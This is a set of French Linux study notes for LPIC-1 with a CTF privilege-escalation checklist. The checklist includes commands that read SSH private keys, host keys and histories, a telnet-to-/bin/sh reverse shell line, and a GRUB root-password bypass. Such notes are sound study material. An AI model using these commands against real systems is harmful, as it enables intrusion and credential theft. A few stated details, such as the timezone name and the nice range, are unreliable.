@@ -1,0 +1,924 @@
+##################################################
+#    LINUX
+#    Préparation LPIC-1 + CTF + Astuces
+##################################################
+
+
+Hardware
+Réseau
+Démarrage
+Services
+Fichiers
+Partitions et filesystems
+Logging
+Package management
+Virtualisation
+Command line
+Texte
+Processus
+Utilisateurs et groupes
+X11
+Localisation et heure
+Mails
+Chiffrement
+CTF
+Vim
+
+
+##############################
+#   HARDWARE
+##############################
+
+- On parle de “Kernel ring buffer” parce que c’est un espace mémoire dédié aux messages du noyau et qui fonctionne de manière circulaire, les nouveaux éléments remplacent les premiers quand l’espace est rempli.
+
+- La commande “dmesg” affiche le contenu du kernel ring buffer.
+
+- Kernel space => Ring 0 => Full access =/= User space => Ring 3 => System calls.
+
+- Tous les changements faits dans /proc/ sont immédiatement reconnus par le kernel.
+
+- "lshw" est une commande utile pour avoir une vue d’ensemble du hardware. Utiliser "lshw -short" pour voir les différentes classes puis "lshw -class processor" pour ne voir que les processeurs par exemple.
+
+- Il y a plein de variantes plus spécifiques pour aller plus vite : lscpu, lspci, lsusb...
+
+- Penser à l’option ‘-vvv’ pour bien détailler le résultat de ces commandes.
+
+- Exemple rapide pour voir combien de mémoire vidéo on possède :
+    1) lspci | grep -i VGA
+    2) lspci -v -s 00:02.0
+
+- "dmidecode" est une commande servant à récupérer les informations du BIOS en le questionnant directement. Elle renvoie les données SMBIOS. Utiliser l’option ‘-t’ pour filtrer de la même manière que pour "lshw -class".
+
+- La commande “free -m” permet d’avoir rapidement les chiffres sur l’utilisation de la RAM et du Swap.
+
+- "lsblk" sert à avoir un visuel des disques et des partitions mais la commande se base sur la table des partitions du kernel qui est chargée dans la RAM. Si on veut interroger les disques eux-mêmes, on doit passer par “fdisk -l” ou “gdisk -l”.
+
+- Penser également à “blkid” qui a l’avantage de montrer tous les périphériques de type bloc, même ceux qui sont formatés ou non-montés.
+
+- Astuce pratique pour diagnostiquer un périphérique USB qui ne monte pas et qui ne donne aucun message d’erreur pour nous aider à dépanner : “dmesg | grep usb”
+
+- Lorsqu’un périphérique est connecté, le kernel remplit les informations correspondantes dans /sys/ puis envoie un message à udev. Ce dernier lit les règles contenues dans /etc/udev/rules.d/ et construit les device nodes correspondants dans le répertoire /dev/.
+
+- La commande “udevadm monitor” permet de voir en temps réel ce que fait l’utilitaire udev.
+
+- La commande “dbus-monitor” permet de voir en temps réel ce que fait l’utilitaire dbus.
+
+- Un module de kernel est un morceau de code auxiliaire que l’on peut charger et décharger à la demande. On peut retrouver la liste des modules dans “/lib/modules/$(uname -r)/kernel” et lister les modules actuellement chargés avec la commande “lsmod”.
+
+- La commande “modinfo” permet d’obtenir toutes les informations sur un module.
+
+- La commande “modprobe” permet de charger et décharger des modules.
+
+- Charger le module wmi : “modprobe -v wmi”
+
+- Décharger le module wmi : “modprobe -r wmi”
+
+- Faire un scan local des modules : “depmod -v”
+
+- Pour charger un module au démarrage il faut créer un fichier texte dans /etc/modules-load.d/ et écrire le nom du module dans ce fichier.
+
+- Pour empêcher un module de se charger au démarrage, il faut créer un fichier texte dans /etc/modprobe.d/ et écrire “blacklist” suivi du nom du module dans ce fichier. Cette opération s’appelle “Blacklister un module” et doit être utilisée le moins possible.
+
+- “initramsfs” = Système de fichiers virtuel initial = Petit système présenté sous forme d’archive CPIO qui se charge dans la RAM avec le noyau lors de l’initialisation afin de monter le système de fichiers racine.
+
+
+##############################
+#   RÉSEAU
+##############################
+
+- Red Hat : /etc/sysconfig/network-scripts/ifcfg-*
+- Debian : /etc/network/interfaces
+- SUSE : /etc/sysconfig/network/ifcfg-*
+
+- systemd-networkd n’est pas aussi puissant que NetworkManager mais gère à la fois les connexions statiques et dynamiques.
+
+- Penser à “man nmcli-examples” pour voir des exemples détaillés.
+
+- La commande “ethtool” sert à voir et modifier les paramètres avancés de la carte réseau.
+
+- Fichiers à vérifier pour les problèmes de DNS :
+        /etc/nsswitch.conf
+        /etc/hosts
+        /etc/resolv.conf
+        /etc/sysconfig/network-scripts/ifcfg-*
+
+
+##############################
+#   DÉMARRAGE
+##############################
+
+- Tous les kernels se situent dans /boot/.
+
+- /proc/cmdline contient les arguments passés au kernel par le bootloader.
+
+- Processus d’un démarrage :
+        1) Firmware stage => Exécution de code par le BIOS
+        2) Bootloader stage => GRUB prend la main
+        3) Kernel stage => Racine temporaire montée en RAM puis décompression du kernel
+        4) Initialization stage => Exécution du premier processus
+
+- Éviter le plus possible de toucher au fichier grub.cfg manuellement. Utiliser la commande grub-mkconfig après des modifications pour les rendre permanentes.
+
+- Contourner un mot de passe root sur un GRUB non-protégé :
+        1) ‘Echap’ au démarrage puis ‘e’ sur la ligne de l’OS voulu.
+        2) Ajouter “single” à la fin de la ligne “kernel” puis appuyer sur ‘b’.
+        3) Modifier le mot de passe root avec “passwd” puis redémarrer.
+
+- Protéger son GRUB :
+        1) grub-crypt >> /boot/grub/grub.conf
+        2) Taper le mot de passe voulu.
+        3) vim /boot/grub/grub.conf
+        4) Copier la ligne apparue à la fin du fichier sous “hiddenmenu”.
+        5) Ajouter “password –encrypted” avant le mot de passe chiffré.
+        6) Mettre “lock” sous chaque “title” que l’on veut protéger avec ce même mot de passe.
+        7) On peut aussi faire un mot de passe local pour chaque title en ajoutant un “password –encrypted XXX” différent sous chaque title mais c’est un besoin plutôt rare.
+
+
+##############################
+#   SERVICES
+##############################
+
+- Service système = Daemon = Processus lancé par l’OS qui tourne en tâche de fond.
+
+- Systemd est le successeur de Upstart et Upstart est le successeur de SysVinit.
+
+- /sbin/init = Premier daemon à être lancé quand le système démarre ou que l’on change les runlevels. Il se base sur le fichier /etc/inittab qui contient les informations, les processus à lancer et les actions à entreprendre.
+
+- Les targets sont l’équivalent des runlevels mais pour Systemd.
+
+- Runlevels :
+        0 = halt = poweroff.target = runlevel0.target
+        1 = single-user = rescue.target = runlevel1.target
+        2 = multi-user mode = multi-user.target = runlevel2.target
+        3 = multi-user mode + networking = multi-user.target = runlevel3.target
+        4 = undefined / custom = multi-user.target = runlevel4.target
+        5 = multi-user mode + networking + GUI = graphical.target = runlevel5.target
+        6 = reboot = reboot.target = runlevel6.target
+
+- S01Boot = Démarré en premier =/= K01Boot = Tué en premier
+
+- La commande “systemctl” est l'outil de gestion de Systemd.
+    => systemctl stop / start / restart / status / is-active / is-enabled / mask / unmask / get-default / list-units / …
+
+- Services en cours : “systemctl list-units -t service”
+
+- En cas de système qui déconne, l’emergency target est pratique car elle n’essaye pas de monter la racine du système mais demande quand même un mot de passe (sauf si "rd.break" est spécifié).
+    => Taper ‘E’ au menu de GRUB et changer "systemd.unit=XXX" en "systemd.unit=emergency.target"
+
+- La commande "systemctl isolate" permet de changer de target unit tout de suite sans redémarrer.
+
+- Systemd manipule des units qui sont définies par des unit files, ces unit files se retrouvent en général dans /lib/systemd/system/, /etc/systemd/system/ ou /run/systemd/system/.
+
+
+##############################
+#   FICHIERS
+##############################
+
+- Penser aux expressions de type “ls {*.gif, *.jpg}” ou “ls !(*.jpg | *.gif)” pour filtrer des formats simplement et proprement.
+
+- “cd -” permet de revenir au dossier précédent sans réécrire tout le chemin.
+
+- Hard links = "ln" = Complètement transparent, pas d’espace en plus sur le disque, même inode, même timestamp. Il faut en revanche supprimer tous les hard links pointant sur un fichier pour vraiment libérer l’espace. Un hard link ne peut pas lier un dossier et ne peut pas lier quoi que ce soit à travers deux systèmes de fichiers différents.
+
+- Symbolic links = "ln -s" = Lien cassé si la source est supprimée et consommation d'espace supplémentaire, mais permet de lier à travers des systèmes de fichiers différents ainsi que sur des dossiers. Ils sont également beaucoup plus simples à identifier (“lrwxrwxrwx”).
+
+- “stat fichier.txt” permet d’afficher le nombre de liens de fichier.txt et beaucoup d’autres métadonnées utiles.
+
+- /proc/self/mounts contient tous les points de montage actuels mais on peut aussi tout simplement les afficher avec “mount” sans arguments.
+
+- Un système ne bootera pas sans le dossier /etc/ parce que ce dernier contient des fichiers de configuration nécessaires aux partitions non-root.
+
+
+##############################
+#   PARTITIONS ET FILESYSTEMS
+##############################
+
+- On ne peut démarrer que d’une partition primaire, pas depuis un disque logique.
+
+- On doit faire “umount” avant de réduire un volume mais pas forcément avant de l’augmenter.
+
+- “dump” et “restore” sont beaucoup plus rapides que “dd” pour cloner un disque Linux parce qu’ils ne copient que les données au lieu de bêtement copier tous les blocs.
+
+- La commande “fsck” possède beaucoup d’options utiles, notamment pour afficher les résultats sans rien toucher (‘-n’), ne réparer que ce qui est sans danger (‘-a’), etc.
+
+- Quand l’UEFI est arrivé, les partitions GUID sont arrivées (= GPT) :
+    => Plus limité à 4 partitions comme les partitions BIOS.
+    => Plus besoin de partitions étendues / disques logiques.
+    => En revanche les vieux systèmes ne gèrent pas ce standard.
+
+LVM = Logical Volume Management = Couche d’abstraction permettant de redimensionner ou bouger les disques par exemple.
+
+- Quelques intérêts du partitionnement :
+    => Séparer un dossier pour en limiter la taille.
+    => Séparer le swap pour optimiser sa vitesse.
+    => Monter des partitions read-only.
+    => Monter des partitions sans privilege escalation (SUID / GUID).
+
+- “cat /proc/partitions” et “lsblk” permettent d’afficher les partitions rapidement.
+
+- Legacy => fdisk / sfdisk / cfdisk ( Normal / Script / Curses )
+- Systèmes modernes => gdisk / sgdisk / cgdisk ( Normal / Script / Curses )
+
+- /etc/mtab = Liste des points actuellement montés.
+- /etc/fstab = Liste des points montés au démarrage.
+- “tail –n X /etc/mtab >> /etc/fstab” permet de monter les X derniers points de manière permanente.
+
+- Ajouter un disque proprement :
+        1) fdisk –l
+        2) fdisk /dev/xxx
+        3) mkfs –t ext4 /dev/xxx
+        4) mount     /dev/xxx     /mon/dossier
+
+- Principaux systèmes de fichiers :
+    - EXT2 = 32 To maximum | 2 To par fichier maximum | Non-journalisé
+    - EXT3 = 32 To maximum | 2 To par fichier maximum | Journalisé
+    - EXT4 = 1 Eo (10^18) maximum | 16 To par fichier maximum | Gère les SSD
+    - XFS  = 8 Eo maximum | 8 Eo par fichier maximum |
+    - Btrfs = 16 Eo maximum | 16 Eo par fichier maximum | Défragmentation automatique, copy-on-write, sous-volumes...
+
+
+##############################
+#   LOGGING
+##############################
+
+- La commande “logger” permet d’écrire dans les logs (/var/logs/messages).
+
+- Pendant le boot les logs sont stockées dans dmesg mais elles sont ensuite transférées dans /var/log quand le boot est terminé.
+
+- Les deux principaux services pour les logs sont Journald et Rsyslogd, par défaut la plupart des distributions modernes utilisent Journald mais les deux sont très populaires.
+
+- Journald :
+    => Fait partie de Systemd.
+    => Non-persistant par défaut => Les logs ne survivent pas au redémarrage si on ne fait pas un dossier “/var/log/journal”.
+    => Peut aussi être configuré pour archiver dans Rsyslogd.
+    => Format binaire structuré et logs stockées en RAM donc très rapide.
+    => Impossible de le lire comme un fichier texte, il faut passer par “journalctl”.
+    => Exemple pratique : “journalctl /sbin/crond –since yesterday”.
+
+- Rsyslogd :
+    => Contient des logs persistantes au format texte.
+    => Se configure avec /etc/rsyslog.conf.
+    => Gère la rotation automatique des évènements et peut être redirigé vers des bases de données comme MySQL.
+    => Les logs peuvent se lire facilement avec un éditeur de texte.
+
+
+##############################
+#   PACKAGE MANAGEMENT
+##############################
+
+- dpkg est la plus vieille commande pour les paquets, c’est elle que l'on utilisait à l’époque des floppy disks. Quand Internet s’est démocratisé, apt est arrivée.
+
+- Penser à “sudo apt list PAQUET” pour chercher un paquet (et aussi à “–installed”).
+
+- "apt-get download" sert à télécharger un paquet sans l’installer.
+
+- "sudo dpkg –info mon_paquet.deb" équivaut à "apt info mon_paquet" mais juste en local.
+
+- "sudo dpkg -S /usr/bin/commande" sert à savoir à quel paquet appartient ce fichier.
+
+- Penser à “apt autoremove” régulièrement pour nettoyer les dépendances obsolètes.
+
+- Les dépôts sont stockés dans “/etc/apt/sources.list” mais aussi dans “/etc/apt/sources.list.d/”. Regarder dans les fichiers texte ou faire “apt policy” si on veut voir en détail.
+
+- “sudo add-apt-repository http://URL/dossier/” => Dépôt public =/= PPA = Personal Package Archive => Dépôt très spécifique en général géré par l’éditeur du logiciel que l’on cherche.
+
+- Penser à “apt-cache depends package” pour voir les dépendances d’un paquet.
+
+- Penser à “dpkg -r XXX” pour désinstaller un paquet en gardant les fichiers de configuration au cas où il faudrait le réinstaller plus tard.
+
+
+##############################
+#   VIRTUALISATION
+##############################
+
+- Hyperviseur de type 1 = Une couche = ESXi et consorts.
+- Hyperviseur de type 2 = Deux couches = Logiciel classique à installer.
+
+- Paravirtualisation = Plus performant grâce au système d’hypercalls mais implique de devoir modifier le kernel.
+
+- Kickstart (Red Hat) = Preseed (Debian) = AutoYaST (SUSE) = Fichiers d’automatisation pour le déploiement de VM.
+
+- Kickstart = /root/anaconda-ks.cfg = Fichier à utiliser pour refaire exactement la même installation. L’autre manière de faire est le clonage mais cela implique de devoir réexporter sur chaque hôte ou de faire un dépôt commun.
+
+
+##############################
+#   COMMAND LINE
+##############################
+
+- Les () et { } servent aussi et surtout à faire des groupes par rapport à '&&', '||' et '>'.
+- C’est surtout pratique pour la redirection dans un fichier de plusieurs trucs en même temps.
+
+- Les parenthèses lancent le groupe de commandes dans un sous-shell.
+- Les accolades lancent le groupe de commandes dans le même shell.
+
+- Les variables d’environnement sont héritées par les sous-shells.
+
+- La commande “set” affiche par défaut les variables du shell courant mais aussi ses fonctions, faire “set -o posix” pour éviter cela.
+
+- “export VAR” sert à mettre VAR dans l’environnement mais ce n’est pas persistant !
+- Il faut mettre cela dans le .bashrc ou dans /etc/profiles.d/ pour que ce soit persistant.
+
+- Faire “export -n VAR” pour retirer VAR de l’environnement.
+
+- Processus lors d’un login dans un shell :
+        1) Exécution de /etc/profile dès qu’on se connecte avec un mot de passe.
+        2) /etc/profile exécute les scripts /etc/profile.d/*.sh (niveau global).
+        3) Bash exécute ensuite $HOME/.bash_profile (contenant aussi des variables d’environnement et des variables de shell mais spécifiques à l’utilisateur).
+        4) ~/.bash_profile exécute le ~/.bashrc local contenant les alias et les fonctions du shell pour l’utilisateur.
+
+- Il y a parfois aussi un fichier /etc/bashrc contenant les alias et les fonctions au niveau du système global.
+- Pour les shells sans login (session déjà ouverte par exemple), seuls les fichiers de type bashrc sont lancés.
+
+- “!!” = commande précédente, “!-4” = commande située 4 places avant, “!10” = 10ème commande de tout l’historique, “!*” = argument précédent (très utile pour les gros chemins ou le scripting).
+
+- “which” va chercher dans quel dossier du PATH se trouve la commande mais se base sur le premier résultat obtenu seulement.
+
+- Named pipe = FIFO special file = Pipe utilisable entre des shells différents.
+- Les named pipes se reconnaissent au fait que leur ligne commence par un “p” quand on fait un "ls -l" dans le dossier où on les crée (“prwxrwxrwx”).
+
+- Penser à la commande “tee” pour rediriger à la fois dans un fichier et sur le STDOUT.
+
+- UNIX options = “-x”   =/=   GNU options = “--word”   =/=   BSD options = “word”.
+
+- Ordre d’exécution : Aliases => Bash functions => Bash built-in commands => On-disk commands.
+
+- Penser à xargs si il y a besoin de construire une commande dans l'autre sens : "echo 'un deux trois' | xargs mkdir"
+
+- La commande “source” sert à exécuter un programme sans démarrer de sous-shell mais aussi à rafraîchir certains fichiers de configuration comme “.bashrc” sans relancer un shell.
+
+
+##############################
+#   TEXTE
+##############################
+
+- [[:digit:]] <=> [0-9] <=> Un chiffre
+- [![:digit:]] <=> Tout sauf un chiffre
+
+- “head” et “tail” sont plus rapides parce qu’ils ne chargent pas et ne lisent pas tout le fichier en mémoire.
+
+- Penser à “split” et “join” pour gérer les fichiers trop gros simplement.
+
+- Penser aux commandes "fmt" et “pr” pour formater des fichiers (affichage ou impression).
+
+- Penser à “cat -A” pour les caractères non-affichables.
+
+- Penser à “expand” pour convertir toutes les tabulations en espaces facilement.
+
+- Les extended regex sont plus simples et puissantes mais pas supportées partout.
+
+- bzcat, xzcat, zcat => cat pour des archives x / x / gzip
+
+- awk est en général plus rapide et plus fiable même pour les choses simples.
+
+- “sed -n ‘s/^root/toor/p’ /etc/passwd “=> Changer root en toor mais en affichant juste le résultat sans modifier le fichier passwd.
+
+- Les back-references sont très pratiques pour trouver certains schémas, par exemple :
+		=> “ sed -E -n '/^(.)(.)(.)\3\2\1$/p' “ = Tous les palindromes de 6 lettres
+
+- Heredoc = Fait de définir un délimiteur soi-même pour écrire des commandes sur plusieurs lignes notamment. Par exemple : "cat <<EOT test EOT"
+
+- Une ligne comme “sed -e "s/a/b/" /tmp/file > /tmp/file” ne marche pas parce que la redirection se fait avant la commande, le fichier obtenu sera systématiquement vide.
+
+
+##############################
+#   PROCESSUS
+##############################
+
+- “ps -C firefox –format pid,uid,%cpu, cmd –sort %cpu, cmd, pid, mem”
+    => Trier les processus de Firefox par utilisation du CPU
+
+- “ps -U timothe –format %mem | awk ‘{memory += $1} ; END {print memory}’ “
+    => Utilisation de la mémoire par l’utilisateur timothe
+
+- L’interface de “top” est customisable en temps réel (informations, filtres…), voir le manuel et les raccourcis.
+
+- La commande “dd” sert à dupliquer un disque mais n’envoie rien à l’écran, envoyer un signal permet dans ce cas de la monitorer un peu mieux.
+    => “kill -USR1 $(pidof dd)” fera afficher la quantité copiée et le temps du dd.
+
+- La priorité d’un processus peut se définir avec “nice” ou “renice”. Le niveau est situé entre -19 (prioritaire) et +19 (non-prioritaire). Par défaut le niveau est à 0.
+
+- La commande “watch” sert à lancer un programme à intervalles réguliers tout en rafraichissant son affichage proprement.
+
+- Ctrl+C <=> SIGINT et Ctrl+Z <=> SIGTSTP.
+
+
+##############################
+#   UTILISATEURS ET GROUPES
+##############################
+
+- “useradd –u 501 –g 650 –G 651,652 –d /home/users/timothe –c “Commentaire” timothe”
+    => Création d’un utilisateur timothe avec l’UID 501, appartenant au groupe principal 650 et aux groupes secondaires 651 et 652. Créer le dossier /home/users si nécessaire mais surtout pas /home/users/timothe, qui doit se générer tout seul. Éviter les nombres sous 500 pour l’UID, quasiment tout est réservé pour le système. On peut aussi changer les paramètres par défaut dans /etc/default/useradd si on utilise souvent les mêmes.
+
+- Modifier un groupe proprement en relogeant tous les fichiers proprement (avec X le nouveau groupe, et Y l'ancien groupe) : “usermod -g X timothe ; find / -gid Y –exec chgrp X”
+
+- Pour bloquer totalement un utilisateur, il faut impérativement changer son shell par défaut en /sbin/nologin.
+
+- “usermod -L bob” va juste bloquer le mot de passe de bob, mais il pourrait toujours se connecter avec des clés SSH par exemple.
+    => “usermod -s /sbin/nologin bob”
+    => “usermod -s /bin/bash bob” pour le débloquer
+
+- Quand l’utilisateur est bloqué par "usermod -L", il y a un '!' devant le champ "password" du fichier /etc/shadow.
+
+- “su – bob” permet de prendre le profil de l’utilisateur bob en chargeant son environnement (.bashrc et .bash_profile notamment).
+
+- Le template utilisé pour les futurs répertoires de connexion se trouve dans /etc/skel. On peut y ajouter des choses ou modifier les fichiers, notamment le .bashrc et le .bash_profile.
+
+- Le SUID s’applique seulement sur des fichiers, le SGID peut s’appliquer partout.
+
+- La suite “shadow-utils” (installée par défaut de nos jours) retire les mots de passe encodés de /etc/passwd et /etc/group pour les placer dans /etc/shadow et /etc/gshadow qui ne sont pas lisibles par tout le monde contrairement aux deux premiers.
+
+- Linux utilise un salt pour éviter les attaques par dictionnaire, le salt se trouve avant le symbole “$” dans le mot de passe encodé et le hash se trouve après.
+
+- /etc/security/pwquality.conf : Police de sécurité pour les mots de passe, paramétrable très finement sur le nombre de caractères, la redondance, les types, etc.
+
+- Différentes manières de surveiller les connexions :
+    users => Voir qui est connecté
+    who => Voir qui et depuis quand
+    w => Voir qui, depuis quand et où
+    last => Derniers logins
+- La voie la plus sûre reste cependant de vérifier les logs.
+
+- Les TCP Wrappers sont à utiliser en complément du firewall, pas à la place
+	=> Voir /etc/hosts.deny et /etc/hosts.allow
+
+- Fichiers importants :
+    - /etc/passwd = Name, ID, primary group ID, home, default shell
+    - /etc/shadow = Encoded password, account aging information
+    - /etc/login.defs = Starting user, group ID, password encoding type
+    - /etc/default/useradd = Groupe par défaut, shell par défaut, expiration...
+
+
+##############################
+#   X11
+##############################
+
+- X est devenu assez compliqué à cause de la rétro-compatibilité (créé en 1984 !). Très adapté aux serveurs mais moins aux ordinateurs de bureau. D’où le développement de Wayland dans les années 2010 par exemple.
+
+- OS < X Window < GUI Toolkit < Desktop environment and applications
+
+- Avant il fallait configurer X Window manuellement avec un fichier. Xorg a amené l’auto-configuration mais on peut toujours le faire manuellement en créant un fichier /etc/X11/xorg.conf et en modifiant le dossier /etc/X11/xorg.conf.d/. On pourrait par exemple forcer le paramétrage du clavier de manière un peu brutale en ouvrant le fichier /etc/X11/xorg.conf.d/00-keyboard.conf et en remplaçant “us” par “fr”.
+
+- X Window permet maintenant de faire du remote GUI de la même manière que VNC ou RDP. C’est le standard sur Linux mais il est entrain de se faire remplacer par Wayland.
+
+- Pour le SSH, bien vérifier que la ligne “X11Forwarding” est à “yes” dans le fichier /etc/ssh/sshd_config
+
+
+##############################
+#   LOCALISATION ET HEURE
+##############################
+
+- Exemple classique pour changer le fuseau, la date et l’heure :
+    1) timedatectl
+    2) timedatectl list-timezones | grep France
+    3) timedatectl set-timezone France/Paris
+    4) timedate-ctl set-time ‘2023-01-01 12:00:00’
+    5) sudo systemctl restart systemd-timedated
+
+- localectl = Équivalent de timedatectl mais pour la région, la langue et le clavier
+    1) localectl list-locales | grep ^fr
+    2) localectl set-locale fr_FR.UTF-8
+    3) localectl list-keymaps | grep ^fr
+    4) localectl set-keymap fr
+
+- Pour jouer de manière dynamique avec les dates on peut utiliser des commandes de la forme “date –date ‘+10 days’ “ mais maintenant la commande “date” permet de faire des choses plus compliquées et abstraites comme “date –date ‘next thursday’ “
+
+- La commande “cal” affiche un calendrier du nombre de mois que l'on veut et de l’année que l'on veut.
+
+- Chrony = Implémentation du protocole NTP = [ chronyc (client) + chronyd (serveur) ]
+    => Configuration avec le fichier /etc/chrony.conf
+
+- Anacron = Utilitaire qui permet de mieux adapter les tâches planifiées même si le PC est éteint. Anacron fait du remplacement et de l’adaptation, il se débrouille avec des contraintes un peu plus abstraites (“une fois par semaine”, etc.)
+
+- Bien échapper les caractères spéciaux dans les tâches planifiées, c'est une erreur courante :
+    => "* */4 * 8 1 tar cvf /sauvegardes/dossier.`date \+\%j`.tar /home/dossier"
+
+
+##############################
+#   MAILS
+##############################
+
+- Sendmail (1983) a été remplacé par Postfix car ce dernier était beaucoup plus simple et intuitif.
+- Postfix est devenu le leader, largement devant ses concurrents comme Qmail ou Exim.
+
+- Installation :
+    1) sudo yum install -y postfix # Si il n'est pas déjà installé
+    2) sudo alternatives –set mta /usr/sbin/sendmail.postfix # Le mettre par défaut
+
+- Exemple de configuration simple de Postfix (/etc/postfix/main.cf) :
+        # DÉBUT DU FICHIER
+        # ...
+        myhostname=monordi.localnet.com
+        mydomain=localnet.com
+        myorigin=$myhostname
+        inet_interfaces=all     # Commenter ce qui ne va pas
+        mydestination = $myhostname, localhost, $mydomain, localhost
+        mynetworks = 192.168.1.0/24, 127.0.0.0/8
+        disable_dns_lookups = yes   # À ajouter à la fin
+        # ...
+        # FIN DU FICHIER
+
+        sudo postfix check # => Vérifier la configuration
+        sudo firewall-cmd –permanent –add-service smtp
+        sudo firewall-cmd –reload
+        sudo systemctl enable postfix
+        sudo systemctl restart postfix
+        sudo systemctl status postfix
+        sudo alternatives –set mta /usr/sbin/sendmail.postfix
+
+        date | mail -s “Test local” user1
+        su - user2
+        mail
+
+- Le fichier /etc/aliases permet de faire du forwarding, il faut aussi "compiler" (= actualiser) le fichier avec la commande "newaliases".
+- Cela peut aussi se faire localement pour chaque utilisateur avec le fichier $HOME/.forward
+
+- Le fichier /etc/postfix/access contient ce qui doit être accepté et rejeté.
+
+
+##############################
+#   CHIFFREMENT
+##############################
+
+- Trois types de configuration :
+    1) Locale ===> ~/.ssh/config
+    2) Command line
+    3) System-wide ===> /etc/ssh/ssh_config
+
+- Du plus prioritaire au moins prioritaire : Command-line > Local > System-wide
+
+- Génération des clés : "gpg2 --gen-key" puis entrer les informations
+
+- Lister les clés : "gpg2 –list-keys"
+
+- Exporter une clé : "gpg2 --export user1 > user1.pub"
+
+- "gpg2 --armor –-recipient user1 --output passwd.gpg --encrypt /etc/passwd"
+    => L’option "armor" permet de sauvegarder aussi en fichier texte, et donc de vérifier avec "cat" après.
+
+
+##############################
+#   CTF
+##############################
+
+Voir aussi : https://gtfobins.github.io/
+
+##### Privilege Escalation
+
+Lister les derniers fichiers créés, ouverts ou modifiés :
+    ===> find / -mtime 5 -xdev > dump.txt
+Lister les fichiers avec des permissions SUID :
+    ===> find / -perm -4000
+
+### Retranscription de la checklist de g0tmi1k pour l'élévation de privilèges.
+### Recopiée en dure au cas où le lien tombe.
+### Voir : https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+- Distribution et version :
+    cat /etc/issue
+    cat /etc/lsb-release # Debian
+    cat /etc/redhat-release # RedHat
+
+- Version du kernel :
+    cat /proc/version
+    uname -a
+    uname -mrs
+    rpm -q kernel
+    dmesg | grep Linux
+    ls /boot | grep vmlinuz-
+
+- Environnement :
+    cat /etc/profile
+    cat /etc/bashrc
+    cat ~/.bash_profile
+    cat ~/.bashrc
+    cat ~/.bash_logout
+    env
+    set
+    ls -ahlR /root/
+    ls -ahlR /home/
+
+- Imprimantes :
+    lpstat -a
+
+- Applications et services :
+    ps aux
+    ps -ef
+    top
+    cat /etc/services
+
+- Services lancés par root :
+    ps aux | grep root
+    ps -ef | grep root
+
+- Applications installées :
+    ls -alh /usr/bin/
+    ls -alh /sbin/
+    dpkg -l
+    rpm -qa
+    ls -alh /var/cache/apt/archivesO
+    ls -alh /var/cache/yum/
+
+- Configuration des services :
+    cat /etc/syslog.conf
+    cat /etc/chttp.conf
+    cat /etc/lighttpd.conf
+    cat /etc/cups/cupsd.conf
+    cat /etc/inetd.conf
+    cat /etc/apache2/apache2.conf
+    cat /etc/my.conf
+    cat /etc/httpd/conf/httpd.conf
+    cat /opt/lampp/etc/httpd.conf
+    ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
+
+- Tâches planifiées :
+    crontab -l
+    ls -alh /var/spool/cron
+    ls -al /etc/ | grep cron
+    ls -al /etc/cron*
+    cat /etc/cron*
+    cat /etc/at.allow
+    cat /etc/at.deny
+    cat /etc/cron.allow
+    cat /etc/cron.deny
+    cat /etc/crontab
+    cat /etc/anacrontab
+    cat /var/spool/cron/crontabs/root
+
+- Cartes réseau :
+    /sbin/ifconfig -a
+    cat /etc/network/interfaces
+    cat /etc/sysconfig/network
+
+- Configuration réseau :
+    cat /etc/resolv.conf
+    cat /etc/sysconfig/network
+    cat /etc/networks
+    iptables -L
+    hostname
+    dnsdomainname
+
+- Autres utilisateurs et machines qui communiquent avec le système :
+    lsof -i
+    lsof -i :80
+    grep 80 /etc/services
+    netstat -antup
+    netstat -antpx
+    netstat -tulpn
+    chkconfig --list
+    chkconfig --list | grep 3:on
+    last
+    w
+
+- Adresses IP et MAC en cache :
+    arp -e
+    route
+    /sbin/route -nee
+
+- Shell distant :
+    nc -lvp 4444
+    nc -lvp 4445
+    telnet [IP] 4444 | /bin/sh | [IP locale] 4445
+
+- SSH :
+    ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
+    ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
+
+    ssh -D 127.0.0.1:9050 -N [username]@[ip]
+    proxychains ifconfig
+
+- Utilisateurs connectés et/ou avec privilèges :
+    id
+    who
+    w
+    last
+    cat /etc/passwd | cut -d: -f1    # List of users
+    grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
+    awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
+    cat /etc/sudoers
+    sudo -l
+
+- Mots de passe, profil et historique :
+    cat /var/apache2/config.inc
+    cat /var/lib/mysql/mysql/user.MYD
+    cat /root/anaconda-ks.cfg
+    cat ~/.bash_history
+    cat ~/.nano_history
+    cat ~/.atftp_history
+    cat ~/.mysql_history
+    cat ~/.php_history
+    cat ~/.bashrc
+    cat ~/.profile
+    cat /var/mail/root
+    cat /var/spool/mail/root
+
+- Clés privées :
+    cat ~/.ssh/authorized_keys
+    cat ~/.ssh/identity.pub
+    cat ~/.ssh/identity
+    cat ~/.ssh/id_rsa.pub
+    cat ~/.ssh/id_rsa
+    cat ~/.ssh/id_dsa.pub
+    cat ~/.ssh/id_dsa
+    cat /etc/ssh/ssh_config
+    cat /etc/ssh/sshd_config
+    cat /etc/ssh/ssh_host_dsa_key.pub
+    cat /etc/ssh/ssh_host_dsa_key
+    cat /etc/ssh/ssh_host_rsa_key.pub
+    cat /etc/ssh/ssh_host_rsa_key
+    cat /etc/ssh/ssh_host_key.pub
+    cat /etc/ssh/ssh_host_key
+
+- Fichiers modifiables dans /etc/ :
+    ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
+    ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
+    ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
+    ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other
+
+    find /etc/ -readable -type f 2>/dev/null               # Anyone
+    find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
+
+- Fichiers intéressants dans /var/ :
+    ls -alh /var/log
+    ls -alh /var/mail
+    ls -alh /var/spool
+    ls -alh /var/spool/lpd
+    ls -alh /var/lib/pgsql
+    ls -alh /var/lib/mysql
+    cat /var/lib/dhcp3/dhclient.leases
+
+- Trucs cachés dans un site :
+    ls -alhR /var/www/
+    ls -alhR /srv/www/htdocs/
+    ls -alhR /usr/local/www/apache22/data/
+    ls -alhR /opt/lampp/htdocs/
+    ls -alhR /var/www/html/
+
+- Logs :
+    cat /etc/httpd/logs/access_log
+    cat /etc/httpd/logs/access.log
